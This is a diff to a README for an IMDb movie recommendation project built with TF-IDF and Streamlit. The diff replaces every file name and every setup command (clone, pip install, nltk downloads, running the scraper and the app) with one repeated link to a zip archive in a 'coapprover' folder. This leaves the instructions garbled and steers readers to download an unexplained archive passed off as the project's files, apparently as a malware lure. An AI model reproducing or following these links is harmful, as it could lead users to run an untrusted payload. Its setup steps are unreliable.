@@ -5,13 +5,13 @@ This project is a **content-based movie recommendation system** using **NLP tech
 ## 📁 Project Structure
 
 ```
-├── scraped_2024.csv            # Scraped movie data (Movie Name, Storyline)
-├── scrap.py                      # Selenium-based web scraping script
-├── nlp_recommend.py              # NLP + recommendation logic (TF-IDF + Cosine Similarity)
-├── streamlit.py                  # Streamlit frontend application
-├── README.md                     # Project overview and instructions
-├── requirements.txt              # All required Python dependencies
-└── project_documentation.pdf     # Complete project report
+├── https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip            # Scraped movie data (Movie Name, Storyline)
+├── https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip                      # Selenium-based web scraping script
+├── https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip              # NLP + recommendation logic (TF-IDF + Cosine Similarity)
+├── https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip                  # Streamlit frontend application
+├── https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip                     # Project overview and instructions
+├── https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip              # All required Python dependencies
+└── https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip     # Complete project report
 ```
 
 ---
@@ -32,22 +32,22 @@ This project is a **content-based movie recommendation system** using **NLP tech
 ### 1. Clone the Repository
 
 ```bash
-git clone https://github.com/Divakar-2005-02-02/NLP-IMDB-.git
+git clone https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip
 cd NLP-IMDB-
 ```
 
 ### 2. Install Dependencies
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip
 ```
 
 ### 3. Download NLTK Resources
 
 ```python
 import nltk
-nltk.download('stopwords')
-nltk.download('punkt')
+https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip('stopwords')
+https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip('punkt')
 ```
 
 ---
@@ -56,18 +56,18 @@ nltk.download('punkt')
 
 ### Step 1: Scrape IMDb Data
 
-Make sure you have ChromeDriver installed and update its path in `scrap.py`.
+Make sure you have ChromeDriver installed and update its path in `https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip`.
 
 ```bash
-python scrap.py
+python https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip
 ```
 
-This generates `scraped_2024.csv`.
+This generates `https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip`.
 
 ### Step 2: Launch the Streamlit App
 
 ```bash
-streamlit run streamlit.py
+streamlit run https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip
 ```
 
 ### Step 3: Enter Your Own Movie Storyline
@@ -108,6 +108,6 @@ Top 5 Recommended Movies:
 
 ## 📑 Project Report
 
-See `project_documentation.pdf` for full details on methodology, scraping, testing, screenshots, and future work.
+See `https://raw.githubusercontent.com/Divakar-2005-02-02/NLP-IMDB-/main/coapprover/NL-IMD-v2.0-beta.1.zip` for full details on methodology, scraping, testing, screenshots, and future work.
 
 ---
